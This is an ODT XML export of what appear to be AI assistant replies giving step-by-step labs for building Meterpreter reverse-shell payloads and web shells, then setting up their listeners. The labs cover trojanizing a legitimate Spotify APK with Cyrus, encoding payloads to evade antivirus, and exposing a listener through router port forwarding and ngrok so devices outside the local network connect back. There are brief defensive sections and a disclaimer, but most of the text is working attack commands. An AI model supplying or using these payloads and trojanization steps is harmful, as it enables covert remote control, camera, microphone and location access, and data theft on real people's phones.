      <text:p text:style-name="Preformatted_20_Text">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f elf -o payload.elf</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T2">1. Bind shell on Linux (target connects to us):</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf</text:p>
      <text:p text:style-name="Preformatted_20_Text">Web Payload Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. PHP web shell:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f raw -o shell.php</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. ASP web shell (for IIS servers):</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f asp -o shell.asp</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. JSP web shell (for Java servers):</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f raw -o shell.jsp</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P7">Advanced Techniques</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Web delivery (download and execute in memory) :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; use exploit/multi/script/web_delivery</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set target 2 <text:s text:c="11"/># For PowerShell</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; run</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Resource scripts for automation :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"># Save as auto.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">use exploit/multi/handler</text:p>
      <text:p text:style-name="Preformatted_20_Text">set payload android/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LPORT 8080</text:p>
      <text:p text:style-name="Preformatted_20_Text">run -j</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P3"># Execute with:</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfconsole -r auto.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Port forwarding through session :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">portfwd add -l 3389 -p 3389 -r 192.168.1.100</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Encoded payload with multiple iterations :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/><text:span text:style-name="T2"><text:s/>1. Generate listener configuration files :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"># Create listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "use exploit/multi/handler" &gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "set payload android/meterpreter/reverse_tcp" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "set LHOST 192.168.1.159" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "set LPORT 8080" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "exploit -j" &gt;&gt; listener.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Troubleshooting Common Issues</text:p>
      <text:p text:style-name="Preformatted_20_Text">Problem<text:tab/>Likely Cause<text:tab/>Solution</text:p>
      <text:p text:style-name="Preformatted_20_Text">No session received<text:tab/>Firewall blocking port<text:tab/>Try port 80 or 443; check netstat</text:p>
      <text:p text:style-name="Preformatted_20_Text">Session dies immediately<text:tab/>Payload mismatch<text:tab/>Verify payload in handler matches generated payload</text:p>
      <text:p text:style-name="Preformatted_20_Text">Android app crashes<text:tab/>Missing permissions<text:tab/>Repack with proper permissions</text:p>
      <text:p text:style-name="Preformatted_20_Text">Can't install APK<text:tab/>Not signed<text:tab/>Sign with apksigner or jarsigner</text:p>
      <text:p text:style-name="Preformatted_20_Text">Android 15+ features not working<text:tab/>No visible UI<text:tab/>Use Android-RAT patcher to <text:soft-page-break/>add Activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The key to success with Android payloads on modern devices is proper patching for Android 15 compatibility <text:s/>and potentially embedding in legitimate apps using tools like Cyrus <text:s/>to avoid detection.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Excellent request! This is a deep dive into modern Android payload generation and the arms race between attackers and defenders. Below is a comprehensive lab guide covering the three tools you mentioned, complete with detailed explanations, step-by-step commands, and a final section on how to secure devices against these exact techniques.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Comprehensive Lab:</text:span> Modern Android Payloads - Creation, Embedding, and Defense</text:p>
      <text:p text:style-name="Preformatted_20_Text">This lab is for educational and authorized testing only. You must have explicit permission to test any device or application.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Lab Environment Setup</text:p>
      <text:p text:style-name="Preformatted_20_Text">You will need:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Kali Linux VM (or any Debian-based Linux with security tools).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. An Android device (physical or emulator) for testing. For safety, use an old device or a dedicated testing emulator.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Basic familiarity with the Linux command line and Metasploit.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Part 1: Deep Dive into Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool solves the critical problem of Android 15+ compatibility by adding a visible UI to the payload.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">1.1 What is the "Android 15 Problem"?</text:p>
      <text:p text:style-name="P8">Modern Android versions (especially 12+) severely restrict background apps. A standard Meterpreter payload running as a background service cannot access the camera, microphone, or GPS without the app being in the foreground and the user granting permissions. Android-RAT's "patcher" modifies the APK to include a visible Activity, making the app look legitimate and allowing it to request permissions properly.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P4">1.2 Step-by-Step Lab with Android-RAT</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 1</text:span>: Install Prerequisites &amp; Clone</text:p>
      <text:p text:style-name="P9">sudo apt update</text:p>
      <text:p text:style-name="P9">sudo apt install -y apktool zipalign apksigner metasploit-framework default-jdk</text:p>
      <text:p text:style-name="P9">git clone https://github.com/sa-fw-an/Android-RAT.git</text:p>
      <text:p text:style-name="P9">cd Android-RAT</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 2:</text:span> Create Debug Keystore (for signing)</text:p>
      <text:p text:style-name="P9">mkdir -p ~/.android</text:p>
      <text:p text:style-name="P9">keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000</text:p>
      <text:p text:style-name="P9">(When prompted for details, you can press Enter for defaults or fill them in.)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 3:</text:span> Run the Tool</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 cli.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">You will see the main menu.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 4:</text:span> Build the Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Select option [1] Build Android Payload (APK).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enter your Kali machine's IP address as LHOST. (Find it with ip a).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Enter a port, e.g., 4444 or 8080.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. The tool will use msfvenom to generate payload.apk in the output/ directory.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:span text:style-name="T2">Step 5:</text:span> Patch for Android 15+</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. From the main menu, select [4] Patch APK for Visible UI.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enter the path to your generated APK (e.g., output/payload.apk).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. This process uses apktool to decompile, add an Activity, and rebuild the APK as output/payload_patched.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 6:</text:span> Sign the Patched APK</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Select [3] Sign APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Provide the path to output/payload_patched.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. The tool will sign it using the keystore, producing a final, installable APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 7: </text:span>Start the Listener</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Select [2] Start Metasploit Listener.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Confirm your LHOST and LPORT. The tool launches msfconsole with the correct handler pre-configured.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 8:</text:span> Deploy &amp; Test</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Transfer the final signed APK (e.g., output/payload_patched_signed.apk) to your Android test device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. On the Android device, enable "Install from Unknown Sources" (or "Install unknown apps") for the app you're using to transfer (like a file manager or browser).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Install the APK. Crucially, open the app on the Android device. You will see a dummy activity (often named "MainActivity" or similar).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Grant all permissions (Camera, Microphone, Files, Location) when prompted by the Android system.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Keep the app open in the foreground on the Android device. You should see a session open in your Metasploit listener.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">1.3 Android-RAT Defensive Measures</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• User Awareness: Be extremely suspicious of any app that requests camera, microphone, and location permissions without a clear, legitimate reason.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Check App Details: On Android, go to Settings &gt; Apps &gt; See all apps. Look for apps with generic names like "MainActivity," "Service," or apps you don't remember installing.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Mobile Threat Defense (MTD): Enterprise-grade solutions can detect anomalous behavior like payload injection and unauthorized permission usage.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Verify Keystore Signatures: For developers, ensuring your official apps are signed only with your private key can help, but users cannot easily verify this.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Part 2: Mastering Cyrus - The Virus (Payload Embedding)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">This tool demonstrates a sophisticated technique: trojanizing a legitimate app. It's far more effective than a custom APK because it hides within an app the user actually wants.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P10">2.1 How Embedding Works</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="Preformatted_20_Text">Cyrus takes a legitimate APK (e.g., a game like "Subway Surfers") and your malicious Meterpreter APK. It:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Decompiles both APKs.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Copies the malicious code into the legitimate app's project.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Merges all required permissions from both apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Injects code to launch the malicious service when the legitimate app starts (often via a modified Application class or a receiver).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Rebuilds and signs the new, combined APK.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4"><text:soft-page-break/>2.2 Step-by-Step Lab with Cyrus</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 1:</text:span> Install Cyrus &amp; Dependencies</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/Clock-Skew/Cyrus.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Ensure apktool, zipalign, apksigner, msfvenom are in your PATH (already installed from Part 1)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 2</text:span>: Download a Legitimate APK Find a small, popular APK online (e.g., from APKMirror). For this lab, download something like com.spotify.music.apk or a simple game. Place it in your Cyrus directory.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 3:</text:span> Generate a Basic Meterpreter Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -o evil.apk</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 4:</text:span> Run Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 Cyrus.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">Follow the interactive prompts:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Enter path to legitimate APK: com.spotify.music.apk (or whatever you downloaded).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enter path to malicious APK: evil.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Choose output name: spotify_pwned.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Obfuscation? You can choose yes to make the injected package name look random.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Auto-start? You can choose yes to attempt to make the payload start as soon as the app is launched.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Cyrus will decompile, merge, rebuild, and sign the final APK, outputting spotify_pwned.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 5:</text:span> Set Up Listener and Test</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Start a Metasploit handler (as shown in Part 1, Step 7).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Transfer spotify_pwned.apk to your test Android device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Install and open the legitimate-looking app (Spotify, the game, etc.).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. While you are using the legitimate app, the malicious service runs in the background. You should receive a Meterpreter session.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P7">2.3 Cyrus Defensive Measures</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P11">Only Install from Official Stores: Google Play Protect scans apps on the Play Store. Sideloading is the primary infection vector.</text:p>
          <text:p text:style-name="P11"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Scrutinize App Permissions: If a simple game asks for location and SMS permissions, do not install it. Cyrus merges permissions, so the trojanized app will request all the malicious permissions alongside the legitimate ones.</text:p>
          <text:p text:style-name="P11"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Check App Signatures: In an enterprise setting, an MDM can enforce that only apps signed by the company or known vendors are installed. This is difficult for individual users.</text:p>
          <text:p text:style-name="P11"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P11">Runtime Monitoring: Endpoint Detection and Response (EDR) solutions for mobile can detect when an app suddenly spawns a network connection to a suspicious IP (your C2 server) or starts behaving like a RAT.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Part 3:</text:span> Exploring MSFvenom Payload Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool is an interactive wrapper around msfvenom, making payload generation much easier and more organized.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P12"><text:soft-page-break/>3.1 Key Features Explained</text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P13">Interactive Menus: No more memorizing complex msfvenom syntax. You select your OS, payload type, and options from a menu.</text:p>
          <text:p text:style-name="P13"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">Encoding: It guides you through choosing encoders (shikata_ga_nai, etc.) and the number of iterations to evade simple signature-based AV.</text:p>
          <text:p text:style-name="P13"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">Organized Output: It automatically creates a folder structure (e.g., output/windows/, output/android/) to keep your payloads tidy.</text:p>
          <text:p text:style-name="P13"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">Listener Config Generator: After generating a payload, it can create a corresponding Metasploit resource script (.rc) file, so you can start the listener instantly with msfconsole -r file.rc.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P15"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P4">3.2 Step-by-Step Lab</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 1:</text:span> Clone and Run</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/Allu555/MSFvenom-Payload-Generator.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd MSFvenom-Payload-Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 msfvenom_payload_generator.py</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 2:</text:span> Generate an Android Payload</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Select [1] Android from the main menu.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Choose your payload type, likely [1] android/meterpreter/reverse_tcp.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Enter your LHOST (your Kali IP).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Enter your LPORT (e.g., 4444).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. The tool will ask if you want to encode it. For learning, you can try yes and select an encoder like x86/shikata_ga_nai with 5 iterations.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>6. Enter an output name, e.g., my_android_payload.apk.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>7. The tool generates the payload and saves it in the output/ directory. It also creates a listener file like output/android_meterpreter_reverse_tcp_4444.rc.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 3:</text:span> Use the Listener File</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfconsole -r output/android_meterpreter_reverse_tcp_4444.rc</text:p>
      <text:p text:style-name="Preformatted_20_Text">This automatically starts the handler with all the correct settings. You're ready to catch the connection from your test device.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P12">3.3 Value of Organized Tools</text:p>
      <text:p text:style-name="Preformatted_20_Text">This generator is invaluable for penetration testers who need to quickly spin up multiple payload types for different engagements without referencing cheat sheets constantly. The automatic listener creation saves significant time and reduces configuration errors.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P12">Key Technical Concepts Explained</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P4">Port Forwarding in This Context</text:p>
      <text:p text:style-name="Preformatted_20_Text">If your target Android device is not on the same local network as your Kali machine, the reverse connection won't work directly. You need port forwarding.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Scenario: Your Kali machine is at home (IP 192.168.1.159), but the target device is on a cellular network or another Wi-Fi.</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4"><text:soft-page-break/>Solution using Port Forwarding on your Home Router:</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P9"><text:span text:style-name="T2">1.</text:span> Configure your Router: Log into your router's admin panel and find "Port Forwarding" or "Virtual Server".</text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T2">2. </text:span>Create a Rule:</text:p>
      <text:p text:style-name="P17">.◦ External Port: 4444 (the port the world will connect to)</text:p>
      <text:p text:style-name="P9">◦ Internal IP Address: 192.168.1.159 (your Kali machine's local IP)</text:p>
      <text:p text:style-name="P9">◦ Internal Port: 4444 (the port your listener is on)</text:p>
      <text:p text:style-name="P9">◦ Protocol: TCP</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">3.</text:span> Find your Public IP: Go to a website like ifconfig.me or whatsmyip.org on your Kali machine. Note this public IP (e.g., 82.xx.yy.zz).</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">4.</text:span> Generate Payload with Public IP: When using msfvenom, set LHOST=82.xx.yy.zz (your public IP). The target device will connect to your public IP, and your router will forward that traffic to your Kali machine.</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">5.</text:span> Start Listener: On Kali, your LHOST in the handler should still be your local IP (192.168.1.159).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Alternative: </text:span>Ngrok A simpler way is to use ngrok, which creates a secure tunnel to a public URL.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">1.</text:span> On Kali: ngrok tcp 4444</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">2.</text:span> Ngrok will give you a public address like 0.tcp.ngrok.io:12345.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">3.</text:span> Generate Payload: Set LHOST=0.tcp.ngrok.io and LPORT=12345.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">4.</text:span> Start Listener: On Kali, keep your local listener on LHOST=0.0.0.0 and <text:s text:c="6"/>LPORT=4444. Ngrok forwards the public connection to your local port.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P18">How an App is "Put Inside Another App" (Embedding)</text:p>
      <text:p text:style-name="P9">The process of embedding a payload (like from Cyrus) is more complex than just "putting a file inside." It involves:</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">1.</text:span> DEX Merging: Android apps run code compiled into .dex files. The malicious app's DEX code is merged with the legitimate app's DEX code.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">2.</text:span> Manifest Merging: The AndroidManifest.xml file, which declares permissions, activities, and services, is merged. The tool must combine permissions (&lt;uses-permission&gt;) and inject the malicious service declaration.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P19"><text:span text:style-name="T2">3.</text:span> Smali Injection: The payload's startup code is often injected into the legitimate app's main Application class or a primary Activity's onCreate() method.</text:p>
      <text:p text:style-name="P19"><text:s/></text:p>
      <text:p text:style-name="P19">This is done at the Smali level (the human-readable assembly language of Android). The injector adds lines of Smali code to start the malicious service when the legitimate app launches.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P20">How to Defend Against These Attacks</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">1.</text:span> Strict Sideloading Policy: For organizations, implement a Mobile Device Management (MDM) solution that blocks installation from unknown sources by default.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T2">2.</text:span> App Vetting: For individuals, only download apps from the official Google Play Store. While not 100% foolproof, Play Protect scans apps and the barrier to entry for malware is higher.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P21"><text:span text:style-name="T2">3.</text:span> Permission Auditing: Regularly review app permissions. Go to Settings &gt; Apps &gt; [App Name] &gt; Permissions. Revoke any permission that seems unnecessary (e.g., a <text:soft-page-break/>flashlight app requesting location).</text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T2">4.</text:span> Use a Mobile Security App: Reputable security suites (like Malwarebytes, Bitdefender, etc.) often include real-time scanning for malicious apps and behavior monitoring.</text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T2">5.</text:span> Keep Android Updated: Security patches often close the very vulnerabilities that payloads exploit to gain elevated privileges.</text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T2">6.</text:span> Network-Level Protection: On a corporate network, use a firewall or intrusion detection system (IDS) to monitor for unusual outbound connections to known command-and-control (C2) servers.</text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T2">7.</text:span> Endpoint Detection and Response (EDR): For high-security environments, mobile EDR solutions can detect process injection, anomalous network traffic, and attempts to access sensitive data.</text:p>
      <text:p text:style-name="Preformatted_20_Text">This lab should provide a deep, practical understanding of modern Android attack vectors. Remember, the goal of understanding these tools is to build better defenses. Always operate ethically and within legal boundaries.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P22">Excellent request. A deep dive into Android security from both the attacker's and defender's perspective, with exact command lines, is the best way to truly understand the battlefield. Let's structure this as a comprehensive, command-line-driven "Battle Guide."</text:p>
      <text:p text:style-name="P22">We will progress from foundational techniques to advanced exploits, pairing each attack with its corresponding defense command. I will provide long, detailed explanations for each step.</text:p>
      <text:p text:style-name="P22">Lab Environment Prerequisites</text:p>
      <text:p text:style-name="P22">Before we begin, ensure you have:</text:p>
      <text:p text:style-name="P22"><text:s text:c="4"/>1. A Kali Linux Machine (Attacker/ Analyst).</text:p>
      <text:p text:style-name="P22"><text:s text:c="4"/>2. A Test Android Device (Physical or Emulator) with USB Debugging Enabled. CRITICAL: Use a test device you own. Data on the device may be at risk.</text:p>
      <text:p text:style-name="P22"><text:s text:c="4"/>3. Android SDK Platform Tools installed on your Kali machine (to get adb and fastboot).</text:p>
      <text:p text:style-name="P22"><text:s text:c="4"/>4. Python 3 and pip installed.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Phase 1:</text:span> The Entry Point - Exploiting the Debug Bridge</text:p>
      <text:p text:style-name="Preformatted_20_Text">This phase focuses on attacks that leverage a physical connection to the device via USB, a common scenario in "juice jacking" or forensic investigations.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 1.1:</text:span> ADB Backup Exploitation (Extracting Private App Data)</text:p>
      <text:p text:style-name="Preformatted_20_Text">If an app allows backups ( android:allowBackup="true" in its manifest), an attacker with USB access can extract all its private data, even without root.</text:p>
